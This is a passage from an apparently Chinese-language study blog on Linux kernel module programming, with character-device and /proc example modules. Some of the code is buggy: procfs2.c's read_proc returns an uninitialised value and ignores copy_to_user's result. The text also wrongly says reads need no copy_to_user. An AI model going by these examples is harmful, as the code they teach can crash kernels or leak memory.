CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="4-1-3-Registering-A-Device"><a href="#4-1-3-Registering-A-Device" class="headerlink" title="4.1.3 Registering A Device"></a>4.1.3 Registering A Device</h4><p>添加一个驱动需要向内核进行注册。该操作会向其分配一个major number（没有minor number因为其只与驱动有关，与内核无关）。使用<code>register_chrdev</code>函数 (<code>linux/fs.h</code>) 进行注册</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_chrdev</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> major, <span class="type">const</span> <span class="type">char</span> *name, <span class="keyword">struct</span> file_operations *fops)</span>;</span><br><span class="line"><span class="comment">// 返回值为负表明注册失败</span></span><br></pre></td></tr></table></figure>

<p><code>unsigned int major</code>: 请求的major number</p>
<p><code>char *name</code>: 设备驱动的名字，会保存在<code>/proc/devices</code>中。</p>
<p><code>struct file_operations *fops</code>： 是<code>file_operations</code>表的指针</p>
<p>注：为了保证请求的<code>major number</code>不与已有的设备驱动冲突，可以 1）查看<code>/Documentation/devices.txt</code>；2）传入<code>major number</code> 0.会返回动态分配的<code>major number</code>。缺点是不能提前新建驱动文件。可以手动创建或构造脚本，或者使用<code>mknod</code>命令自动创建</p>
<p>注：存在一种方式自动创建设备<code>class_create()</code>，Linux内核提供一组函数，可以用来在模块加载的时候自动在&#x2F;dev目录下创建相应的设备节点，并在卸载模块时删除该节点，当然前提条件是用户空间移植了<a href="https://zhuanlan.zhihu.com/p/373517974">udev</a>（一个用户空间程序）。内核中定义了<code>struct class</code>结构体，顾名思义，一个<code>struct class</code>结构体类型变量对应一个类，内核同时提供了<code>class_create()</code>函数，可以用它来创建一个类，这个类存放在sysfs下，一旦创建好后，再调用<code>device_create()</code>函数来在&#x2F;dev目录下创建相应的设备节点。这样，加载模块的时候，用户空间中的udev会自动响应<code>device_create()</code>函数，去&#x2F;sysfs下寻找对应的类从而创建设备节点。i</p>
<h4 id="4-1-4-Unregistering-A-Device"><a href="#4-1-4-Unregistering-A-Device" class="headerlink" title="4.1.4 Unregistering A Device"></a>4.1.4 Unregistering A Device</h4><p>我们不能让root用户需要需要使用内核模块时将其卸载。如果设备驱动文件被一个进程打开然后将其内核模块卸载，使用该文件会造成对原内核模块对应的内存地址的访问，但由于内存地址已发生改变，会导致意想不到的结果。</p>
<p>一般情况下，可以让函数返回负值来禁用某功能，不过<code>cleaup_module</code>无法实现因为其为<code>void</code>函数。不过，存在一个计数器来记录多少进程在占用模块。通过<code>/proc/modules</code>的第三个参数即可。若不为零，则无法卸载（该操作内核已实现）</p>
<p>可以使用以下函数来改变计数器值：</p>
<p><code>try_module_get(THIS_MODULE)</code>: 增加计数</p>
<p><code>module_put(THIS_MODULE)</code>： 减少计数</p>
<h4 id="4-1-5-chardev-c"><a href="#4-1-5-chardev-c" class="headerlink" title="4.1.5 chardev.c"></a>4.1.5 chardev.c</h4><p>以下代码创建了一个字符类设备驱动<code>chardev</code>。该设备文件可以记录设备文件被读取的次数。无法写入该设备文件，不过会记录此行为并告知用户该行为不受支持。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  chardev.c: Creates a read-only char device that says how many times</span></span><br><span class="line"><span class="comment"> *  you&#x27;ve read from the dev file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span>	<span class="comment">/* for put_user */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  Prototypes - this would normally go in a .h file</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;chardev&quot;</span>	<span class="comment">/* Dev name as it appears in /proc/devices   */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_LEN 80		<span class="comment">/* Max length of the message from the device */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Global variables are declared as static, so are global within the file. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Major;		<span class="comment">/* Major number assigned to our device driver */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> Device_Open = <span class="number">0</span>;	<span class="comment">/* Is device open?  </span></span><br><span class="line"><span class="comment">				 * Used to prevent multiple access to device */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> msg[BUF_LEN];	<span class="comment">/* The msg the device will give when asked */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *msg_Ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">	.read = device_read,</span><br><span class="line">	.write = device_write,</span><br><span class="line">	.open = device_open,</span><br><span class="line">	.release = device_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function is called when the module is loaded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        Major = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;fops);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Major &lt; <span class="number">0</span>) &#123;</span><br><span class="line">	  printk(KERN_ALERT <span class="string">&quot;Registering char device failed with %d\n&quot;</span>, Major);</span><br><span class="line">	  <span class="keyword">return</span> Major;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;I was assigned major number %d. To talk to\n&quot;</span>, Major);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;the driver, create a dev file with\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;&#x27;mknod /dev/%s c %d 0&#x27;.\n&quot;</span>, DEVICE_NAME, Major);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Try various minor numbers. Try to cat and echo to\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;the device file.\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Remove the device file and module when done.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function is called when the module is unloaded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Unregister the device </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> ret = unregister_chrdev(Major, DEVICE_NAME);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		printk(KERN_ALERT <span class="string">&quot;Error in unregister_chrdev: %d\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Methods</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process tries to open the device file, like</span></span><br><span class="line"><span class="comment"> * &quot;cat /dev/mycharfile&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Device_Open)</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">	Device_Open++;</span><br><span class="line">	<span class="built_in">sprintf</span>(msg, <span class="string">&quot;I already told you %d times Hello world!\n&quot;</span>, counter++);</span><br><span class="line">	msg_Ptr = msg;</span><br><span class="line">	try_module_get(THIS_MODULE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process closes the device file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">	Device_Open--;		<span class="comment">/* We&#x27;re now ready for our next caller */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Decrement the usage count, or else once you opened the file, you&#x27;ll</span></span><br><span class="line"><span class="comment">	 * never get get rid of the module. </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	module_put(THIS_MODULE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Called when a process, which already opened the dev file, attempts to</span></span><br><span class="line"><span class="comment"> * read from it.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">device_read</span><span class="params">(<span class="keyword">struct</span> file *filp,	<span class="comment">/* see include/linux/fs.h   */</span></span></span><br><span class="line"><span class="params">			   <span class="type">char</span> *buffer,	<span class="comment">/* buffer to fill with data */</span></span></span><br><span class="line"><span class="params">			   <span class="type">size_t</span> length,	<span class="comment">/* length of the buffer     */</span></span></span><br><span class="line"><span class="params">			   <span class="type">loff_t</span> * offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of bytes actually written to the buffer </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> bytes_read = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we&#x27;re at the end of the message, </span></span><br><span class="line"><span class="comment">	 * return 0 signifying end of file </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (*msg_Ptr == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Actually put the data into the buffer </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">while</span> (length &amp;&amp; *msg_Ptr) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* </span></span><br><span class="line"><span class="comment">		 * The buffer is in the user data segment, not the kernel </span></span><br><span class="line"><span class="comment">		 * segment so &quot;*&quot; assignment won&#x27;t work.  We have to use </span></span><br><span class="line"><span class="comment">		 * put_user which copies data from the kernel data segment to</span></span><br><span class="line"><span class="comment">		 * the user data segment. </span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		put_user(*(msg_Ptr++), buffer++);</span><br><span class="line"></span><br><span class="line">		length--;</span><br><span class="line">		bytes_read++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Most read functions return the number of bytes put into the buffer</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> bytes_read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * Called when a process writes to dev file: echo &quot;hi&quot; &gt; /dev/hello </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> *buff, <span class="type">size_t</span> len, <span class="type">loff_t</span> * off)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;Sorry, this operation isn&#x27;t supported.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到成功装载模块，<code>major number506</code>。</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240114145543938.png" alt="image-20240114145543938"></p>
<p>使用<code>mknod</code>命令创建新设备驱动文件，读取内容，可以看到次数发生改变。无写入权限。</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240114145523551.png" alt="image-20240114145523551"></p>
<h4 id="4-1-6-兼容多个版本的内核模块"><a href="#4-1-6-兼容多个版本的内核模块" class="headerlink" title="4.1.6 兼容多个版本的内核模块"></a>4.1.6 兼容多个版本的内核模块</h4><p><strong>内核暴露给进程的系统调用在各个版本之间基本一致。可能会加入新的系统调用，但是旧的调用的行为会保持不变（向后兼容）。</strong>不过有一些系统版本（奇数：开发版）会有改变。</p>
<p>为了适应不同版本，需要编写条件编译指令。将<code>LINUX_VERSION_CODE</code>与<code>KERNEL_VERSION</code>进行比较。如果内核版本为<code>a.b.c</code>，宏的值应为<code>$2^&#123;16&#125;a+2^&#123;8&#125;b+c$</code></p>
<h2 id="Chapter-5-The-proc-File-System"><a href="#Chapter-5-The-proc-File-System" class="headerlink" title="Chapter 5. The &#x2F;proc File System"></a>Chapter 5. The &#x2F;proc File System</h2><h3 id="5-1-The-proc-File-System"><a href="#5-1-The-proc-File-System" class="headerlink" title="5.1 The &#x2F;proc File System"></a>5.1 The &#x2F;proc File System</h3><p>在Linux系统中，内核和内核模块有一种另外的方式与进程通信——&#x2F;proc 文件系统。&#x2F;proc文件系统最初的设计是为了方便访问进程信息，现在它被内核广泛调用来获取信息。</p>
<p>使用&#x2F;proc文件系统的方法与设备驱动程序相似，使用&#x2F;proc文件所需信息创建一个结构体，包括指向处理函数的指针。然后<code>init_module</code>注册该结构，<code>cleanup_module</code>注销。</p>
<p>为避免冲突，使用<code>proc_register_dynamic</code>来让内核决定<code>inode number</code>，与普通的文件系统不同，<code>/proc</code>文件系统位于内存中。在正常情况下，<code>inode number</code>是指向文件在磁盘位置的指针。<code>inode</code>包含文件的基本信息，例如权限，硬盘位置指针。</p>
<p>在以下代码中，打开&#x2F;关闭文件并不会调用函数，因此不会放入<code>try_module_get</code>和<code>try_module_put</code>函数，如果文件被打开时模块被删除，那么会导致内存访问越界。</p>
<p>当使用<code>proc_create</code>函数加载模块时，将创建<code>/proc/helloworld</code>返回值是一个结构体<code>struct proc_dir_entry</code>，并且该结构体会用于配置<code>/proc/helloworld</code>，例如文件拥有者。若返回空，则表明创建失败。</p>
<p>每当文件<code>/proc/helloworld</code>被读取时，函数<code>procfs_read</code>会被调用。有两个参数比较重要<code>buffer： 返回给读取文件应用进程的内容</code>, <code>offset： 当前文件的位置</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  procfs1.c -  create a &quot;file&quot; in /proc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span>	<span class="comment">/* Necessary because we use the proc fs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">proc_parent</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len, temp;</span><br><span class="line"><span class="type">char</span> *msg;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(count &gt; temp)</span><br><span class="line">		count = temp;</span><br><span class="line">	temp = temp-count;</span><br><span class="line"></span><br><span class="line">	raw_copy_to_user(buf, msg, count);</span><br><span class="line">	<span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">		temp = len;</span><br><span class="line">	<span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">	.proc_read = read_proc</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_proc_entry</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*create a file named world, and read attribute to this file using proc_fops*/</span></span><br><span class="line">	proc_create(<span class="string">&quot;world&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">	msg = <span class="string">&quot;hello world\n&quot;</span>;		<span class="comment">/*file content*/</span></span><br><span class="line">	len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">	temp = len;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;1.len=%d&quot;</span>, len);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;proc initialized&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">proc_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	create_new_proc_entry();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">proc_cleanup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Inside cleanup_module\n&quot;</span>);</span><br><span class="line">	remove_proc_entry(<span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(proc_init);</span><br><span class="line">module_exit(proc_cleanup);</span><br></pre></td></tr></table></figure>

<p>结果如下图所示：</p>
<p><img src="/img/posts/2024-1-4-LKM%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0.assets/image-20240115091551536.png" alt="image-20240115091551536"></p>
<h3 id="5-2-读写-proc文件"><a href="#5-2-读写-proc文件" class="headerlink" title="5.2 读写&#x2F;proc文件"></a>5.2 读写&#x2F;proc文件</h3><p>文件写入使用<code>copy_from_user</code>或<code>get_user</code>读取用户输入，与read不同。</p>
<p>使用<code>copy_from_user</code>或<code>get_user</code>函数的原因为Linux系统内存是分段的，指针指向内存地址不是实际内存上特定地址，而是一个内存段上的地址。内核有一个内存段，其他每个进程都有一个内存段。</p>
<p>每个进程都只能访问他自己的内存段，因此当编写作为进程运行的一般程序时，不需要担心此问题。当编写内核模块时，一般情况下系统会自动让你访问内核的内存段。然而，当内存缓冲区的内容需要在进程与内核之间传递时，内核函数会接受一个指向进程内存段的指针。<code>put_user</code>和<code>get_user</code>可以让你成功访问这些内存地址。不过这两个函数一次只能处理一个字符，可以使用<code>copy_to_user</code>和<code>copy_from_user</code>来处理字符串。由于buffer位于内和空间，因此对于写入操作而言你需要引入用户空间的数据，即只能使用<code>copy_from_user</code>函数，而读取操作因为数据本身就在内核态，可以不使用<code>copy_to_user</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  procfs2.c -  create a &quot;file&quot; in /proc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span>	<span class="comment">/* Necessary because we use the proc fs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span>	<span class="comment">/* for copy_from_user */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_MAX_SIZE     1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_NAME         <span class="string">&quot;bufferlk&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The buffer used to store character for this module</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> procfs_buffer[PROCFS_MAX_SIZE];</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The size of the buffer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> procfs_buffer_size = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * This function is called then the /proc file is read</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;procfile_read (/proc/%s) called\n&quot;</span>, PROCFS_NAME);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Read data: %s&quot;</span>, procfs_buffer);</span><br><span class="line">    <span class="keyword">if</span> (*offp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* we have finished to read, return 0 */</span></span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* fill the buffer, return the buffer size*/</span></span><br><span class="line">        copy_to_user(buf, procfs_buffer, procfs_buffer_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This function is called with the /proc file is written</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">write_proc</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">		   <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* get buffer size */</span></span><br><span class="line">	procfs_buffer_size = count;</span><br><span class="line">	<span class="keyword">if</span> (procfs_buffer_size &gt; PROCFS_MAX_SIZE ) &#123;</span><br><span class="line">		procfs_buffer_size = PROCFS_MAX_SIZE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* write data to the buffer */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> ( copy_from_user(procfs_buffer, buffer, procfs_buffer_size) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Write data: %s&quot;</span>, procfs_buffer);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> procfs_buffer_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">    .proc_read = read_proc,</span><br><span class="line">    .proc_write = write_proc,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *This function is called when the module is loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* create the /proc file */</span></span><br><span class="line">	proc_create(PROCFS_NAME, <span class="number">0644</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;/proc/%s created\n&quot;</span>, PROCFS_NAME);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	<span class="comment">/* everything is ok */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *This function is called when the module is unloaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	remove_proc_entry(PROCFS_NAME, <span class="literal">NULL</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;/proc/%s removed\n&quot;</span>, PROCFS_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita_Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>写入并读取内容</p>
